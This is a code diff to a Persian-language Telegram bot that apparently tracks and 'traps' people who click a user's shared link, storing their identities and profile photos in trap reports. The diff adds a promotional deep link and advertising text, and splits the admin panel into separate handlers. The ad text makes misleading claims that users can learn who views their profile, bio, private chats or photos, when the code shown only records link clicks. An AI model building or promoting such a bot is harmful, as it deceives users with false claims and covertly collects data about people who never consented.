@@ -194,7 +194,7 @@ def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name, rep
             except:
                 pass
 
-# ---------- هندلر استارت ----------
+# ---------- هندلر استارت (با پشتیبانی از لینک تبلیغاتی) ----------
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -206,6 +206,30 @@ def start(message):
               (user_id, str(user_id), name))
     conn.commit()
     
+    # ========== لینک تبلیغاتی (ad) ==========
+    if text == "/start ad":
+        keyboard = InlineKeyboardMarkup(row_width=2)
+        keyboard.add(
+            InlineKeyboardButton("💬 پیام ناشناس", callback_data="ad_anon"),
+            InlineKeyboardButton("📝 بیوگرافی", callback_data="ad_bio"),
+            InlineKeyboardButton("📨 پیوی", callback_data="ad_pv"),
+            InlineKeyboardButton("🖼 عکس پروفایل", callback_data="ad_photo")
+        )
+        
+        ad_welcome = (
+            "👋 **به ربات «کی داره نگاه میکنه؟» خوش اومدی!** 😂\n\n"
+            "با این ربات می‌تونی بفهمی چه کسانی پروفایلت رو چک می‌کنن!\n\n"
+            "🔹 **چطور کار میکنه؟**\n"
+            "1️⃣ یک لینک اختصاصی از ربات می‌گیری\n"
+            "2️⃣ لینک رو توی بیوگرافی یا کانالت می‌ذاری\n"
+            "3️⃣ هرکی کلیک کنه، می‌فهمی کی بوده! 😉\n\n"
+            "👇 **برای شروع، روی یکی از دکمه‌های زیر کلیک کن:**"
+        )
+        
+        bot.send_message(user_id, ad_welcome, reply_markup=keyboard, parse_mode='Markdown')
+        return
+    
+    # ========== لینک معمولی (track_xxx) ==========
     if text.startswith("/start track_"):
         code = text.split("track_")[1]
         owner_id = get_owner_id_by_code(code)
@@ -502,7 +526,32 @@ def show_photo(call):
     except:
         bot.send_message(call.message.chat.id, "❌ امکان نمایش عکس وجود ندارد.")
 
-# ---------- پنل مدیریت ----------
+# ========== دکمه‌های تبلیغاتی (ad) ==========
+@bot.callback_query_handler(func=lambda call: call.data.startswith("ad_"))
+def ad_buttons(call):
+    action = call.data.split("_")[1]
+    user_id = call.from_user.id
+    
+    messages = {
+        "anon": "💬 **پیام ناشناس**\n\nبا دریافت لینک اختصاصی، می‌تونی به کاربرای فضول پیام ناشناس بدی!",
+        "bio": "📝 **بیوگرافی**\n\nبا دریافت لینک اختصاصی، می‌تونی ببینی چه کسانی بیوگرافیت رو چک می‌کنن!",
+        "pv": "📨 **پیوی**\n\nبا دریافت لینک اختصاصی، می‌تونی بفهمی چه کسانی پیوی‌ات رو چک می‌کنن!",
+        "photo": "🖼 **عکس پروفایل**\n\nببین چه کسانی عکس پروفایلت رو می‌بینن!"
+    }
+    
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton("🔗 دریافت لینک من", callback_data="get_my_link"))
+    
+    bot.send_message(
+        user_id,
+        messages.get(action, "❌ گزینه نامعتبر!"),
+        reply_markup=keyboard,
+        parse_mode='Markdown'
+    )
+    
+    bot.answer_callback_query(call.id, "✅")
+
+# ========== پنل مدیریت (با دکمه تبلیغات) ==========
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
     user_id = message.from_user.id
@@ -516,6 +565,7 @@ def admin_panel(message):
         InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_users"),
         InlineKeyboardButton("📋 گزارش‌های تله", callback_data="admin_reports"),
         InlineKeyboardButton("🖼 عکس‌های ذخیره شده", callback_data="admin_photos"),
+        InlineKeyboardButton("📢 تبلیغات", callback_data="admin_advertise"),  # دکمه جدید
         InlineKeyboardButton("🗑 پاک کردن دیتابیس", callback_data="admin_clear"),
         InlineKeyboardButton("🔙 بستن پنل", callback_data="admin_close")
     )
@@ -531,99 +581,180 @@ def admin_panel(message):
     
     bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
-def admin_callback(call):
+@bot.callback_query_handler(func=lambda call: call.data == "admin_advertise")
+def admin_advertise(call):
     user_id = call.from_user.id
     if user_id not in ADMIN_IDS:
         bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
         return
     
-    action = call.data.split("_")[1]
+    try:
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+    except:
+        pass
     
-    if action == "stats":
-        text = (
-            "📊 **آمار کامل ربات**\n\n"
-            f"👤 کل کاربران: {get_total_users()}\n"
-            f"📝 گزارش‌های در انتظار: {get_total_reports()}\n"
-            f"🎯 کاربران در تله رفته: {get_total_trapped()}\n"
-            f"🖼 عکس‌های مچ‌گیری: {get_total_photos()}"
-        )
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        
-    elif action == "users":
-        c.execute("SELECT telegram_id, user_name, link_code FROM users ORDER BY telegram_id DESC LIMIT 30")
-        users = c.fetchall()
-        if not users:
-            text = "📭 هیچ کاربری در دیتابیس یافت نشد."
-        else:
-            text = "👥 **لیست ۳۰ کاربر اخیر:**\n\n"
-            for uid, name, code in users:
-                display_name = name if name else "بدون نام"
-                text += f"• {display_name} (ID: `{uid}`)\n"
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        
-    elif action == "reports":
-        c.execute("SELECT id, owner_id, clicker_id, expires_at, cancelled FROM pending_reports ORDER BY id DESC LIMIT 20")
-        reports = c.fetchall()
-        if not reports:
-            text = "📭 هیچ گزارشی یافت نشد."
-        else:
-            text = "📋 **۲۰ گزارش اخیر:**\n\n"
-            for rid, owner_id, clicker_id, expires_at, cancelled in reports:
-                owner_name = get_owner_name(owner_id)
-                clicker_name = get_clicker_name(clicker_id)
-                status = "❌ لغو شده" if cancelled else "⏳ در انتظار"
-                text += f"• {owner_name} ← {clicker_name} [{status}]\n"
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        
-    elif action == "photos":
-        c.execute("SELECT user_id, photo_id FROM user_photos LIMIT 20")
-        photos = c.fetchall()
-        if not photos:
-            text = "📭 هیچ عکسی ذخیره نشده است."
-        else:
-            text = "🖼 **آخرین عکس‌های ذخیره شده:**\n\n"
-            for uid, pid in photos:
-                name = get_owner_name(uid)
-                text += f"• {name} (ID: `{uid}`)\n"
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        
-    elif action == "clear":
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(
-            InlineKeyboardButton("✅ بله، پاک کن!", callback_data="admin_confirm_clear"),
-            InlineKeyboardButton("❌ نه، انصراف", callback_data="admin_close")
-        )
-        bot.edit_message_text(
-            "⚠️ **هشدار جدی!**\n\nآیا از پاک کردن تمام دیتابیس مطمئنی؟\n\n"
-            "❗️ این عمل غیرقابل بازگشت است و تمام اطلاعات زیر حذف می‌شوند:\n"
-            "• لیست کاربران\n"
-            "• گزارش‌های تله\n"
-            "• عکس‌های مچ‌گیری\n"
-            "• تاریخچه کاربرانی که در تله افتاده‌اند",
-            call.message.chat.id, call.message.message_id,
-            reply_markup=keyboard, parse_mode='Markdown'
-        )
-        
-    elif action == "confirm_clear":
-        c.execute("DELETE FROM users")
-        c.execute("DELETE FROM pending_reports")
-        c.execute("DELETE FROM user_photos")
-        c.execute("DELETE FROM trapped_history")
-        conn.commit()
-        bot.edit_message_text(
-            "✅ **دیتابیس با موفقیت پاک شد!**\n\n"
-            "تمامی اطلاعات کاربران و گزارش‌ها حذف گردید.",
-            call.message.chat.id, call.message.message_id,
-            parse_mode='Markdown'
-        )
-        
-    elif action == "close":
-        try:
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-        except:
-            bot.edit_message_text("🔒 پنل مدیریت بسته شد.", call.message.chat.id, call.message.message_id)
+    ad_link = f"https://t.me/{BOT_USERNAME}?start=ad"
     
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("💬 پیام ناشناس", url=ad_link),
+        InlineKeyboardButton("📝 بیوگرافی", url=ad_link),
+        InlineKeyboardButton("📨 پیوی", url=ad_link),
+        InlineKeyboardButton("🖼 عکس پروفایل", url=ad_link)
+    )
+    keyboard.add(
+        InlineKeyboardButton("📋 کپی لینک", callback_data=f"copy_ad_link_{ad_link}"),
+        InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel")
+    )
+    
+    ad_text = (
+        "📢 **لینک تبلیغاتی ربات**\n\n"
+        "🔗 **لینک:**\n"
+        f"`{ad_link}`\n\n"
+        "📌 **نحوه استفاده:**\n"
+        "این لینک رو در گروه‌ها، کانال‌ها، استوری و پیوی خود منتشر کنید.\n"
+        "هر کاربری روی این لینک کلیک کنه، وارد ربات میشه.\n\n"
+        "👇 **دکمه‌های زیر رو هم همراه لینک استفاده کن:**"
+    )
+    
+    bot.send_message(
+        user_id,
+        ad_text,
+        reply_markup=keyboard,
+        parse_mode='Markdown'
+    )
+    
+    bot.answer_callback_query(call.id, "✅ لینک تبلیغاتی ساخته شد!")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_ad_link_"))
+def copy_ad_link(call):
+    ad_link = call.data.replace("copy_ad_link_", "")
+    bot.answer_callback_query(
+        call.id, 
+        f"✅ لینک کپی شد!\n{ad_link}", 
+        show_alert=True
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
+def admin_stats(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    text = (
+        "📊 **آمار کامل ربات**\n\n"
+        f"👤 کل کاربران: {get_total_users()}\n"
+        f"📝 گزارش‌های در انتظار: {get_total_reports()}\n"
+        f"🎯 کاربران در تله رفته: {get_total_trapped()}\n"
+        f"🖼 عکس‌های مچ‌گیری: {get_total_photos()}"
+    )
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_users")
+def admin_users(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    c.execute("SELECT telegram_id, user_name, link_code FROM users ORDER BY telegram_id DESC LIMIT 30")
+    users = c.fetchall()
+    if not users:
+        text = "📭 هیچ کاربری در دیتابیس یافت نشد."
+    else:
+        text = "👥 **لیست ۳۰ کاربر اخیر:**\n\n"
+        for uid, name, code in users:
+            display_name = name if name else "بدون نام"
+            text += f"• {display_name} (ID: `{uid}`)\n"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_reports")
+def admin_reports(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    c.execute("SELECT id, owner_id, clicker_id, expires_at, cancelled FROM pending_reports ORDER BY id DESC LIMIT 20")
+    reports = c.fetchall()
+    if not reports:
+        text = "📭 هیچ گزارشی یافت نشد."
+    else:
+        text = "📋 **۲۰ گزارش اخیر:**\n\n"
+        for rid, owner_id, clicker_id, expires_at, cancelled in reports:
+            owner_name = get_owner_name(owner_id)
+            clicker_name = get_clicker_name(clicker_id)
+            status = "❌ لغو شده" if cancelled else "⏳ در انتظار"
+            text += f"• {owner_name} ← {clicker_name} [{status}]\n"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_photos")
+def admin_photos(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    c.execute("SELECT user_id, photo_id FROM user_photos LIMIT 20")
+    photos = c.fetchall()
+    if not photos:
+        text = "📭 هیچ عکسی ذخیره نشده است."
+    else:
+        text = "🖼 **آخرین عکس‌های ذخیره شده:**\n\n"
+        for uid, pid in photos:
+            name = get_owner_name(uid)
+            text += f"• {name} (ID: `{uid}`)\n"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_clear")
+def admin_clear(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(
+        InlineKeyboardButton("✅ بله، پاک کن!", callback_data="admin_confirm_clear"),
+        InlineKeyboardButton("❌ نه، انصراف", callback_data="admin_close")
+    )
+    bot.edit_message_text(
+        "⚠️ **هشدار جدی!**\n\nآیا از پاک کردن تمام دیتابیس مطمئنی؟\n\n"
+        "❗️ این عمل غیرقابل بازگشت است و تمام اطلاعات زیر حذف می‌شوند:\n"
+        "• لیست کاربران\n"
+        "• گزارش‌های تله\n"
+        "• عکس‌های مچ‌گیری\n"
+        "• تاریخچه کاربرانی که در تله افتاده‌اند",
+        call.message.chat.id, call.message.message_id,
+        reply_markup=keyboard, parse_mode='Markdown'
+    )
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_confirm_clear")
+def admin_confirm_clear(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    c.execute("DELETE FROM users")
+    c.execute("DELETE FROM pending_reports")
+    c.execute("DELETE FROM user_photos")
+    c.execute("DELETE FROM trapped_history")
+    conn.commit()
+    bot.edit_message_text(
+        "✅ **دیتابیس با موفقیت پاک شد!**\n\n"
+        "تمامی اطلاعات کاربران و گزارش‌ها حذف گردید.",
+        call.message.chat.id, call.message.message_id,
+        parse_mode='Markdown'
+    )
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_close")
+def admin_close(call):
+    try:
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+    except:
+        bot.edit_message_text("🔒 پنل مدیریت بسته شد.", call.message.chat.id, call.message.message_id)
     bot.answer_callback_query(call.id)
 
 # ---------- مسیرهای Flask ----------
